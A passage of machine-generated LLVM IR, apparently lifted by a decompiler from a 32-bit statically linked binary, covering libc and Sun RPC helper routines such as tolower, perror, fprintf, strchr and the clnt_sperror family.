  %v1_805a05f = add i32 %arg2, 14
  %v2_805a05f = inttoptr i32 %v1_805a05f to i16*
  %v3_805a05f = load i16, i16* %v2_805a05f, align 2
  %v4_805a05f = icmp eq i16 %v3_805a05f, 0
  %v1_805a064 = icmp eq i1 %v4_805a05f, false
  br i1 %v1_805a064, label %dec_label_pc_805a080, label %dec_label_pc_805a066

dec_label_pc_805a066:                             ; preds = %entry
  %v1_805a066 = add i32 %arg2, 16
  %v2_805a066 = inttoptr i32 %v1_805a066 to i32*
  store i32 -554899859, i32* %v2_805a066, align 4
  %v0_805a06d = load i32, i32* %esi.global-to-local, align 4
  %v1_805a06d = add i32 %v0_805a06d, 20
  %v2_805a06d = inttoptr i32 %v1_805a06d to i32*
  store i32 5, i32* %v2_805a06d, align 4
  %v0_805a074 = load i32, i32* %esi.global-to-local, align 4
  %v1_805a074 = add i32 %v0_805a074, 12
  %v2_805a074 = inttoptr i32 %v1_805a074 to i16*
  store i16 11, i16* %v2_805a074, align 2
  %v0_805a07a = load i32, i32* %esi.global-to-local, align 4
  %v1_805a07a = add i32 %v0_805a07a, 14
  %v2_805a07a = inttoptr i32 %v1_805a07a to i16*
  store i16 1, i16* %v2_805a07a, align 2
  %v0_805a0a1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805a080

dec_label_pc_805a080:                             ; preds = %entry, %dec_label_pc_805a066
  %v0_805a0c1 = phi i32 [ %arg2, %entry ], [ %v0_805a0a1.pre, %dec_label_pc_805a066 ]
  %v4_805a080 = ptrtoint i16* %arg1 to i32
  %v1_805a086 = add i32 %v4_805a080, 2
  %v2_805a086 = inttoptr i32 %v1_805a086 to i16*
  %v3_805a086 = load i16, i16* %v2_805a086, align 2
  %v4_805a086 = zext i16 %v3_805a086 to i32
  store i32 %v4_805a080, i32* %ecx.global-to-local, align 4
  %v2_805a094 = mul nuw i32 %v4_805a086, 65536
  store i32 %v2_805a094, i32* %eax.global-to-local, align 4
  %v1_805a09a = add i32 %v4_805a080, 4
  %v2_805a09a = inttoptr i32 %v1_805a09a to i16*
  %v3_805a09a = load i16, i16* %v2_805a09a, align 2
  %v4_805a09a = zext i16 %v3_805a09a to i32
  store i32 %v4_805a09a, i32* %eax.global-to-local, align 4
  %v2_805a09e = load i16, i16* %arg1, align 2
  %v3_805a09e = zext i16 %v2_805a09e to i32
  store i32 %v3_805a09e, i32* %ecx.global-to-local, align 4
  %v1_805a0a1 = add i32 %v0_805a0c1, 16
  %v2_805a0a1 = inttoptr i32 %v1_805a0a1 to i32*
  %v3_805a0a1 = load i32, i32* %v2_805a0a1, align 4
  store i32 %v3_805a09e, i32* %eax.global-to-local, align 4
  store i32 %v2_805a094, i32* %ecx.global-to-local, align 4
  %v4_805a0b2 = mul i32 %v3_805a0a1, %v4_805a09a
  %v1_805a0b5 = add i32 %v0_805a0c1, 20
  %v2_805a0b5 = inttoptr i32 %v1_805a0b5 to i32*
  %v3_805a0b5 = load i32, i32* %v2_805a0b5, align 4
  %v2_805a0b8 = or i32 %v3_805a09e, %v2_805a094
  store i32 %v2_805a0b8, i32* %ecx.global-to-local, align 4
  %v4_805a0ba = mul i32 %v3_805a0b5, %v2_805a0b8
  store i32 %v2_805a0b8, i32* %eax.global-to-local, align 4
  %v2_805a0bf = add i32 %v4_805a0ba, %v4_805a0b2
  %v3_805a0c1 = load i32, i32* %v2_805a0a1, align 4
  %v5_805a0c1 = zext i32 %v3_805a0c1 to i64
  %v6_805a0c1 = zext i32 %v2_805a0b8 to i64
  %v7_805a0c1 = mul nuw i64 %v5_805a0c1, %v6_805a0c1
  %v8_805a0c1 = trunc i64 %v7_805a0c1 to i32
  %v9_805a0c1 = udiv i64 %v7_805a0c1, 4294967296
  %v10_805a0c1 = trunc i64 %v9_805a0c1 to i32
  store i32 %v8_805a0c1, i32* %eax.global-to-local, align 4
  store i32 %v8_805a0c1, i32* %ecx.global-to-local, align 4
  %v1_805a0c6 = add i32 %v0_805a0c1, 12
  %v2_805a0c6 = inttoptr i32 %v1_805a0c6 to i16*
  %v3_805a0c6 = load i16, i16* %v2_805a0c6, align 2
  %v4_805a0c6 = zext i16 %v3_805a0c6 to i32
  %v2_805a0ca = add i32 %v10_805a0c1, %v2_805a0bf
  %v2_805a0cf = add i32 %v4_805a0c6, %v8_805a0c1
  %v7_805a0cf = icmp ult i32 %v2_805a0cf, %v4_805a0c6
  store i32 %v2_805a0cf, i32* %eax.global-to-local, align 4
  store i32 %v4_805a080, i32* %ecx.global-to-local, align 4
  %v3_805a0d5 = zext i1 %v7_805a0cf to i32
  %v5_805a0d5 = add i32 %v2_805a0ca, %v3_805a0d5
  %v1_805a0d7 = trunc i32 %v2_805a0cf to i16
  store i16 %v1_805a0d7, i16* %arg1, align 2
  %v3_805a0da = udiv i32 %v2_805a0cf, 65536
  %v4_805a0da = mul i32 %v5_805a0d5, 65536
  %v5_805a0da = or i32 %v4_805a0da, %v3_805a0da
  store i32 %v5_805a0da, i32* %eax.global-to-local, align 4
  %v1_805a0e1 = trunc i32 %v3_805a0da to i16
  %v2_805a0e1 = load i32, i32* %ecx.global-to-local, align 4
  %v3_805a0e1 = add i32 %v2_805a0e1, 2
  %v4_805a0e1 = inttoptr i32 %v3_805a0e1 to i16*
  store i16 %v1_805a0e1, i16* %v4_805a0e1, align 2
  %v0_805a0e5 = load i32, i32* %eax.global-to-local, align 4
  %v3_805a0e5 = udiv i32 %v0_805a0e5, 65536
  %v1_805a0e9 = trunc i32 %v3_805a0e5 to i16
  %v2_805a0e9 = load i32, i32* %ecx.global-to-local, align 4
  %v3_805a0e9 = add i32 %v2_805a0e9, 4
  %v4_805a0e9 = inttoptr i32 %v3_805a0e9 to i16*
  store i16 %v1_805a0e9, i16* %v4_805a0e9, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_805a0c6, { 1, 0 }
  uselistorder i32 %v2_805a0b8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805a094, { 2, 1, 0 }
  uselistorder i32 %v4_805a080, { 3, 0, 2, 1 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 15, 14, 16, 18, 17, 20, 19 }
  uselistorder i16 1, { 2, 3, 1, 0 }
  uselistorder i32 20, { 86, 87, 68, 69, 70, 43, 3, 73, 6, 88, 42, 93, 91, 94, 95, 71, 9, 72, 29, 30, 31, 32, 33, 34, 35, 36, 37, 92, 44, 45, 46, 47, 48, 49, 50, 1, 38, 51, 52, 53, 54, 55, 74, 75, 7, 89, 90, 58, 4, 15, 56, 67, 57, 96, 79, 80, 81, 82, 83, 10, 84, 85, 97, 76, 64, 77, 59, 60, 61, 62, 63, 78, 99, 98, 16, 17, 18, 19, 20, 21, 22, 26, 23, 24, 25, 0, 27, 28, 2, 65, 39, 40, 41, 66, 11, 12, 8, 13, 14, 5 }
  uselistorder i16 0, { 18, 0, 8, 19, 16, 1, 9, 3, 2, 10, 20, 14, 21, 6, 11, 7, 12, 13, 17, 4, 5, 15 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805a080, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_805a0fc = add i32 %arg1, 128
  %v6_805a107 = icmp ugt i32 %v1_805a0fc, 383
  br i1 %v6_805a107, label %dec_label_pc_805a112, label %dec_label_pc_805a109

dec_label_pc_805a109:                             ; preds = %entry
  %v0_805a109 = load i32, i32* bitcast (i32** @global_var_8062dc8.227 to i32*), align 8
  %v2_805a10e = mul i32 %arg1, 2
  %v3_805a10e = add i32 %v0_805a109, %v2_805a10e
  %v4_805a10e = inttoptr i32 %v3_805a10e to i16*
  %v5_805a10e = load i16, i16* %v4_805a10e, align 2
  %v6_805a10e = sext i16 %v5_805a10e to i32
  store i32 %v6_805a10e, i32* @edx, align 4
  br label %dec_label_pc_805a112

dec_label_pc_805a112:                             ; preds = %entry, %dec_label_pc_805a109
  %v0_805a112 = phi i32 [ %arg1, %entry ], [ %v6_805a10e, %dec_label_pc_805a109 ]
  ret i32 %v0_805a112

; uselistorder directives
  uselistorder i32 65536, { 3, 1, 4, 2, 5, 0, 7, 6, 9, 8, 10, 11, 12, 13, 14, 15, 17, 16, 19, 18, 21, 20, 23, 22, 24, 25, 32, 34, 26, 27, 28, 30, 29, 31, 33 }
  uselistorder i32 128, { 18, 4, 13, 15, 5, 14, 24, 16, 0, 6, 7, 8, 9, 19, 20, 21, 22, 23, 3, 1, 25, 10, 11, 12, 17, 2 }
  uselistorder label %dec_label_pc_805a112, { 1, 0 }
}

define i32 @perror() local_unnamed_addr {
entry:
  %tmp = call i8* @__decompiler_undefined_function_1()
  %v1_805a11f = icmp eq i8* %tmp, null
  br i1 %v1_805a11f, label %dec_label_pc_805a12d, label %dec_label_pc_805a123

dec_label_pc_805a123:                             ; preds = %entry
  %v4_805a11b = ptrtoint i8* %tmp to i32
  %v2_805a123 = load i8, i8* %tmp, align 1
  %v3_805a123 = icmp eq i8 %v2_805a123, 0
  %v1_805a12b = icmp eq i1 %v3_805a123, false
  br i1 %v1_805a12b, label %dec_label_pc_805a134, label %dec_label_pc_805a12d

dec_label_pc_805a12d:                             ; preds = %dec_label_pc_805a123, %entry
  br label %dec_label_pc_805a134

dec_label_pc_805a134:                             ; preds = %dec_label_pc_805a123, %dec_label_pc_805a12d
  %v0_805a135 = phi i32 [ ptrtoint (i32* @global_var_805d10e.352 to i32), %dec_label_pc_805a12d ], [ %v4_805a11b, %dec_label_pc_805a123 ]
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_805d10e.352 to i32), %dec_label_pc_805a12d ], [ ptrtoint ([3 x i8]* @global_var_805d10c.351 to i32), %dec_label_pc_805a123 ]
  %v0_805a134 = phi i32 [ ptrtoint (i32* @global_var_805d10e.352 to i32), %dec_label_pc_805a12d ], [ ptrtoint ([3 x i8]* @global_var_805d10c.351 to i32), %dec_label_pc_805a123 ]
  store i32 %storemerge, i32* @edx, align 4
  %v0_805a13b = load i32, i32* @global_var_8062b70, align 16
  %v6_805a141 = call i32 @fprintf(i32 %v0_805a13b, i32 ptrtoint ([8 x i8]* @global_var_805d0e8.353 to i32), i32 %v0_805a135, i32 %v0_805a134)
  ret i32 %v6_805a141

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_805d10e.352 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_805a134, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805a14f = ptrtoint i32* %stack_var_12 to i32
  %v0_805a157 = load i32, i32* @edx, align 4
  %v4_805a161 = inttoptr i32 %arg1 to i16*
  %v5_805a161 = call i32 @__GI_vfprintf(i16* %v4_805a161, i32 %arg2, i32 %v2_805a14f, i32 %v0_805a157)
  ret i32 %v5_805a161
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_805a16d = ptrtoint i8* %arg1 to i32
  %v2_805a175 = mul i32 %arg2, 256
  %v3_805a175 = and i32 %v2_805a175, 65280
  %v4_805a175 = and i32 %arg2, -65281
  %v5_805a175 = or i32 %v3_805a175, %v4_805a175
  %v8_805a177.pre = load i1, i1* @df, align 1
  %v9_805a177 = select i1 %v8_805a177.pre, i32 -1, i32 1
  br label %dec_label_pc_805a177

dec_label_pc_805a177:                             ; preds = %dec_label_pc_805a17c, %entry
  %v4_805a177 = phi i32 [ %v6_805a177, %dec_label_pc_805a17c ], [ %v5_805a175, %entry ]
  %v7_805a177 = phi i32 [ %v10_805a177, %dec_label_pc_805a17c ], [ %v4_805a16d, %entry ]
  %v1_805a177 = inttoptr i32 %v7_805a177 to i8*
  %v2_805a177 = load i8, i8* %v1_805a177, align 1
  %v10_805a177 = add i32 %v7_805a177, %v9_805a177
  %v3_805a178 = udiv i32 %v4_805a177, 256
  %v4_805a178 = trunc i32 %v3_805a178 to i8
  %v16_805a178 = icmp eq i8 %v2_805a177, %v4_805a178
  br i1 %v16_805a178, label %dec_label_pc_805a185, label %dec_label_pc_805a17c

dec_label_pc_805a17c:                             ; preds = %dec_label_pc_805a177
  %v3_805a177 = zext i8 %v2_805a177 to i32
  %v5_805a177 = and i32 %v4_805a177, -256
  %v6_805a177 = or i32 %v3_805a177, %v5_805a177
  %v4_805a17c = icmp eq i8 %v2_805a177, 0
  %v1_805a17e = icmp eq i1 %v4_805a17c, false
  br i1 %v1_805a17e, label %dec_label_pc_805a177, label %dec_label_pc_805a180

dec_label_pc_805a180:                             ; preds = %dec_label_pc_805a17c
  br label %dec_label_pc_805a185

dec_label_pc_805a185:                             ; preds = %dec_label_pc_805a177, %dec_label_pc_805a180
  %v0_805a185 = phi i32 [ 1, %dec_label_pc_805a180 ], [ %v10_805a177, %dec_label_pc_805a177 ]
  %v1_805a187 = add i32 %v0_805a185, -1
  ret i32 %v1_805a187

; uselistorder directives
  uselistorder i8 %v2_805a177, { 1, 2, 0 }
  uselistorder i32 %v4_805a177, { 1, 0 }
  uselistorder i32 -256, { 45, 1, 46, 0, 47, 11, 16, 48, 49, 25, 26, 27, 3, 34, 33, 2, 17, 18, 19, 20, 50, 51, 6, 52, 4, 53, 5, 54, 55, 21, 22, 23, 24, 8, 36, 35, 7, 82, 83, 60, 64, 65, 66, 67, 68, 69, 12, 70, 71, 72, 84, 13, 41, 14, 87, 42, 9, 43, 97, 56, 61, 73, 74, 75, 76, 77, 78, 79, 10, 80, 81, 62, 37, 85, 86, 28, 88, 29, 30, 31, 91, 92, 93, 95, 96, 94, 90, 89, 15, 32, 38, 39, 40, 44, 57, 58, 59, 63 }
  uselistorder i1* @df, { 1, 4, 20, 21, 0, 2, 5, 22, 23, 24, 25, 3, 34, 35, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 -65281, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805a185, { 1, 0 }
}

define i32 @__GI_clnt_sperrno(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  br label %dec_label_pc_805a194

dec_label_pc_805a194:                             ; preds = %entry, %dec_label_pc_805a1aa
  %v0_805a1aa9 = phi i32 [ 0, %entry ], [ %v1_805a1aa, %dec_label_pc_805a1aa ]
  %v1_805a194 = mul i32 %v0_805a1aa9, 8
  %v2_805a194 = add i32 %v1_805a194, ptrtoint (i32* @global_var_805d300.354 to i32)
  %v3_805a194 = inttoptr i32 %v2_805a194 to i32*
  %v4_805a194 = load i32, i32* %v3_805a194, align 8
  %v16_805a194 = icmp eq i32 %v4_805a194, %arg1
  %v1_805a19b = icmp eq i1 %v16_805a194, false
  br i1 %v1_805a19b, label %dec_label_pc_805a1aa, label %dec_label_pc_805a19d

dec_label_pc_805a19d:                             ; preds = %dec_label_pc_805a194
  %v2_805a19d = add i32 %v1_805a194, ptrtoint (i32* @global_var_805d304.355 to i32)
  %v3_805a19d = inttoptr i32 %v2_805a19d to i32*
  %v4_805a19d = load i32, i32* %v3_805a19d, align 4
  %v1_805a1a4 = add i32 %v4_805a19d, ptrtoint ([13 x i8]* @global_var_805d3a0.356 to i32)
  ret i32 %v1_805a1a4

dec_label_pc_805a1aa:                             ; preds = %dec_label_pc_805a194
  %v1_805a1aa = add i32 %v0_805a1aa9, 1
  %tmp = icmp ult i32 %v1_805a1aa, 18
  br i1 %tmp, label %dec_label_pc_805a194, label %dec_label_pc_805a1b0

dec_label_pc_805a1b0:                             ; preds = %dec_label_pc_805a1aa
  ret i32 ptrtoint ([26 x i8]* @global_var_805d0f0.357 to i32)

; uselistorder directives
  uselistorder i32 %v0_805a1aa9, { 1, 0 }
  uselistorder label %dec_label_pc_805a194, { 1, 0 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  %v1_805a1b9 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v1_805a1c1 = add i32 %v1_805a1b9, 156
  %v2_805a1c1 = inttoptr i32 %v1_805a1c1 to i32*
  %v3_805a1c1 = load i32, i32* %v2_805a1c1, align 4
  %v1_805a1c7 = call i32 @free(i32 %v3_805a1c1)
  ret i32 %v1_805a1c7

; uselistorder directives
  uselistorder i32 (i32)* @free, { 49, 47, 50, 14, 13, 12, 11, 35, 34, 33, 32, 31, 30, 29, 28, 17, 46, 10, 51, 48, 16, 15, 9, 7, 6, 5, 4, 3, 2, 1, 8, 27, 26, 25, 24, 23, 22, 21, 38, 37, 20, 0, 45, 44, 19, 43, 42, 41, 40, 39, 36, 18 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 18, 19, 20, 3, 4, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 46, 47, 48, 49, 50, 51, 52, 53, 54, 44, 45, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89 }
}

define i32 @clnt_perrno(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805a1d8 = load i32, i32* @global_var_8062b70, align 16
  store i32 %v0_805a1d8, i32* @ebx, align 4
  %v1_805a1de = call i32 @__GI_clnt_sperrno(i32 %arg1)
  %v0_805a1e4 = load i32, i32* @ebx, align 4
  %v2_805a1e6 = call i32 @__GI_fputs(i32 %v1_805a1de, i32 %v0_805a1e4)
  ret i32 %v2_805a1e6
}

define i32 @_buf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a1f0 = load i32, i32* @ebx, align 4
  store i32 %v0_805a1f0, i32* %stack_var_-4, align 4
  %v1_805a1f4 = call i32 @__rpc_thread_variables(i32 %v0_805a1f0)
  %v1_805a1f9 = add i32 %v1_805a1f4, 156
  %v2_805a1f9 = inttoptr i32 %v1_805a1f9 to i32*
  %v3_805a1f9 = load i32, i32* %v2_805a1f9, align 4
  %v4_805a1f9 = icmp eq i32 %v3_805a1f9, 0
  store i32 %v1_805a1f4, i32* @ebx, align 4
  %v1_805a202 = icmp eq i1 %v4_805a1f9, false
  br i1 %v1_805a202, label %dec_label_pc_805a21a, label %dec_label_pc_805a204

dec_label_pc_805a204:                             ; preds = %entry
  %v1_805a20c = call i32 @malloc(i32 256)
  %v1_805a214 = load i32, i32* @ebx, align 4
  %v2_805a214 = add i32 %v1_805a214, 156
  %v3_805a214 = inttoptr i32 %v2_805a214 to i32*
  store i32 %v1_805a20c, i32* %v3_805a214, align 4
  %v0_805a21a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805a21a

dec_label_pc_805a21a:                             ; preds = %entry, %dec_label_pc_805a204
  %v0_805a21a = phi i32 [ %v1_805a1f4, %entry ], [ %v0_805a21a.pre, %dec_label_pc_805a204 ]
  %v1_805a21a = add i32 %v0_805a21a, 156
  %v2_805a21a = inttoptr i32 %v1_805a21a to i32*
  %v3_805a21a = load i32, i32* %v2_805a21a, align 4
  %v2_805a220 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a220, i32* @ecx, align 4
  %v2_805a222 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a222, i32* @ebx, align 4
  ret i32 %v3_805a21a

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 24, 27, 6, 5, 4, 13, 12, 7, 26, 25, 23, 1, 0, 22, 2, 3, 14, 11, 10, 17, 20, 21, 19, 18, 16, 15, 9, 8 }
  uselistorder i32 156, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 (i32)* @__rpc_thread_variables, { 12, 17, 5, 16, 15, 14, 13, 11, 2, 4, 10, 3, 9, 1, 8, 0, 7, 6 }
  uselistorder label %dec_label_pc_805a21a, { 1, 0 }
}

define i32 @clnt_spcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-1040 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805a224 = load i32, i32* @ebp, align 4
  %v0_805a225 = load i32, i32* @edi, align 4
  %v0_805a226 = load i32, i32* @esi, align 4
  %v0_805a227 = load i32, i32* @ebx, align 4
  store i32 %v0_805a227, i32* %stack_var_-16, align 4
  %v3_805a22e = call i32 @_buf(i32 %v0_805a227, i32 %v0_805a226, i32 %v0_805a225)
  %v1_805a233 = icmp eq i32 %v3_805a22e, 0
  store i32 %v3_805a22e, i32* @ebp, align 4
  br i1 %v1_805a233, label %dec_label_pc_805a309, label %dec_label_pc_805a23d

dec_label_pc_805a23d:                             ; preds = %entry
  %v0_805a23d = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_805a23d, i32* @edi, align 4
  %v3_805a252 = call i32 @sprintf(i32 ptrtoint ([5 x i8]* @global_var_805d10a.358 to i32), i32 %arg1)
  %v0_805a257 = load i32, i32* @edi, align 4
  %v1_805a257 = inttoptr i32 %v0_805a257 to i32*
  %v2_805a257 = load i32, i32* %v1_805a257, align 4
  %v0_805a259 = load i32, i32* @ebp, align 4
  %v2_805a259 = add i32 %v0_805a259, %v3_805a252
  store i32 %v2_805a259, i32* %ebx.global-to-local, align 4
  %v1_805a25d = call i32 @__GI_clnt_sperrno(i32 %v2_805a257)
  store i32 %v1_805a25d, i32* @eax, align 4
  %v5_805a266 = inttoptr i32 %v2_805a259 to i8*
  %v5_805a267 = call i32 @strcpy(i8* %v5_805a266, i32 %v1_805a25d)
  %v4_805a26c = inttoptr i32 %v2_805a259 to i8*
  %v3_805a26f = call i32 @strlen(i8* %v4_805a26c)
  %v2_805a277 = add i32 %v2_805a259, %v3_805a26f
  store i32 %v2_805a277, i32* %ebx.global-to-local, align 4
  %v0_805a279 = load i32, i32* @edi, align 4
  %v1_805a279 = inttoptr i32 %v0_805a279 to i32*
  %v2_805a279 = load i32, i32* %v1_805a279, align 4
  store i32 %v2_805a279, i32* @eax, align 4
  %v9_805a27b = icmp eq i32 %v2_805a279, 12
  br i1 %v9_805a27b, label %dec_label_pc_805a2be, label %dec_label_pc_805a280

dec_label_pc_805a280:                             ; preds = %dec_label_pc_805a23d
  %v9_805a280 = icmp eq i32 %v2_805a279, 14
  %v1_805a283 = icmp eq i1 %v9_805a280, false
  br i1 %v1_805a283, label %dec_label_pc_805a302, label %dec_label_pc_805a285

dec_label_pc_805a285:                             ; preds = %dec_label_pc_805a280
  %v5_805a28c = inttoptr i32 %v2_805a277 to i8*
  %v5_805a28d = call i32 @strcpy(i8* %v5_805a28c, i32 ptrtoint ([4 x i8]* @global_var_805d10f.359 to i32))
  %v0_805a292 = load i32, i32* %ebx.global-to-local, align 4
  %v4_805a292 = inttoptr i32 %v0_805a292 to i8*
  %v3_805a295 = call i32 @strlen(i8* %v4_805a292)
  %v0_805a29d = load i32, i32* @edi, align 4
  %v1_805a29d = add i32 %v0_805a29d, 4
  %v2_805a29d = inttoptr i32 %v1_805a29d to i32*
  %v3_805a29d = load i32, i32* %v2_805a29d, align 4
  %v0_805a2a0 = load i32, i32* %ebx.global-to-local, align 4
  %v3_805a2a0 = add i32 %v0_805a2a0, %v3_805a295
  store i32 %v3_805a2a0, i32* %ebx.global-to-local, align 4
  %v1_805a2a2 = call i32 @__GI_clnt_sperrno(i32 %v3_805a29d)
  store i32 %v1_805a2a2, i32* @eax, align 4
  %v5_805a2a9 = inttoptr i32 %v3_805a2a0 to i8*
  %v5_805a2aa = call i32 @strcpy(i8* %v5_805a2a9, i32 %v1_805a2a2)
  %v4_805a2af = inttoptr i32 %v3_805a2a0 to i8*
  %v3_805a2b2 = call i32 @strlen(i8* %v4_805a2af)
  %v3_805a2ba = add i32 %v3_805a2a0, %v3_805a2b2
  store i32 %v3_805a2ba, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a302

dec_label_pc_805a2be:                             ; preds = %dec_label_pc_805a23d
  %v5_805a2c5 = inttoptr i32 %v2_805a277 to i8*
  %v5_805a2c6 = call i32 @strcpy(i8* %v5_805a2c5, i32 ptrtoint ([4 x i8]* @global_var_805d10f.359 to i32))
  %v0_805a2cb = load i32, i32* %ebx.global-to-local, align 4
  %v4_805a2cb = inttoptr i32 %v0_805a2cb to i8*
  %v3_805a2ce = call i32 @strlen(i8* %v4_805a2cb)
  %v2_805a2db = add i32 %v0_805a2cb, %v3_805a2ce
  store i32 %v2_805a2db, i32* @esi, align 4
  %v2_805a2de = ptrtoint i32* %stack_var_-1040 to i32
  store i32 %v2_805a2de, i32* @ebx, align 4
  %v0_805a2e3 = load i32, i32* @edi, align 4
  %v1_805a2e3 = add i32 %v0_805a2e3, 8
  %v2_805a2e3 = inttoptr i32 %v1_805a2e3 to i32*
  %v3_805a2e3 = load i32, i32* %v2_805a2e3, align 4
  %v5_805a2e6 = call i32 @__GI___glibc_strerror_r(i32 %v3_805a2e3, i32 %v2_805a2de, i32 1024)
  %v3_805a2ec = ptrtoint i32* %stack_var_-1040 to i32
  store i32 %v3_805a2ec, i32* @eax, align 4
  %v0_805a2ee = load i32, i32* @esi, align 4
  %v5_805a2ee = inttoptr i32 %v0_805a2ee to i8*
  %v5_805a2ef = call i32 @strcpy(i8* %v5_805a2ee, i32 %v2_805a2de)
  %v0_805a2f4 = load i32, i32* @esi, align 4
  %v4_805a2f4 = inttoptr i32 %v0_805a2f4 to i8*
  %v3_805a2f7 = call i32 @strlen(i8* %v4_805a2f4)
  %v0_805a2ff = load i32, i32* @esi, align 4
  %v2_805a2ff = add i32 %v0_805a2ff, %v3_805a2f7
  store i32 %v2_805a2ff, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a302

dec_label_pc_805a302:                             ; preds = %dec_label_pc_805a280, %dec_label_pc_805a285, %dec_label_pc_805a2be
  %v0_805a302 = phi i32 [ %v2_805a277, %dec_label_pc_805a280 ], [ %v3_805a2ba, %dec_label_pc_805a285 ], [ %v2_805a2ff, %dec_label_pc_805a2be ]
  %v1_805a302 = inttoptr i32 %v0_805a302 to i8*
  store i8 10, i8* %v1_805a302, align 1
  %v0_805a305 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a305 = add i32 %v0_805a305, 1
  %v2_805a305 = inttoptr i32 %v1_805a305 to i8*
  store i8 0, i8* %v2_805a305, align 1
  %v0_805a30f.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805a309

dec_label_pc_805a309:                             ; preds = %entry, %dec_label_pc_805a302
  %v0_805a30f = phi i32 [ 0, %entry ], [ %v0_805a30f.pre, %dec_label_pc_805a302 ]
  %v2_805a311 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805a311, i32* @ebx, align 4
  store i32 %v0_805a226, i32* @esi, align 4
  store i32 %v0_805a225, i32* @edi, align 4
  store i32 %v0_805a224, i32* @ebp, align 4
  ret i32 %v0_805a30f

; uselistorder directives
  uselistorder i32 %v2_805a2de, { 1, 0, 2 }
  uselistorder i32 %v3_805a2a0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805a259, { 1, 0, 2, 3 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805a309, { 1, 0 }
  uselistorder label %dec_label_pc_805a302, { 2, 1, 0 }
}

define i32 @clnt_pcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805a31e = load i32, i32* @global_var_8062b70, align 16
  store i32 %v0_805a31e, i32* @ebx, align 4
  %v1_805a324 = call i32 @clnt_spcreateerror(i32 %arg1)
  store i32 %arg1, i32* @edx, align 4
  %v0_805a32b = load i32, i32* @ebx, align 4
  %v2_805a32d = call i32 @__GI_fputs(i32 %v1_805a324, i32 %v0_805a32b)
  ret i32 %v2_805a32d
}

define i32 @__GI_clnt_sperror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1056 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805a337 = load i32, i32* @ebp, align 4
  %v0_805a338 = load i32, i32* @edi, align 4
  %v0_805a339 = load i32, i32* @esi, align 4
  %v0_805a33a = load i32, i32* @ebx, align 4
  store i32 %v0_805a33a, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805a348 = call i32 @_buf(i32 %v0_805a33a, i32 %v0_805a339, i32 %v0_805a338)
  store i32 %v3_805a348, i32* @ebp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805a351 = icmp eq i32 %v3_805a348, 0
  br i1 %v2_805a351, label %dec_label_pc_805a49f, label %dec_label_pc_805a359

dec_label_pc_805a359:                             ; preds = %entry
  %v0_805a35b = load i32, i32* @ebx, align 4
  %v1_805a35b = add i32 %v0_805a35b, 4
  %v2_805a35b = inttoptr i32 %v1_805a35b to i32*
  %v3_805a35b = load i32, i32* %v2_805a35b, align 4
  %v2_805a35e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_805a35e, i32* %eax.global-to-local, align 4
  %v7_805a367 = add i32 %v3_805a35b, 8
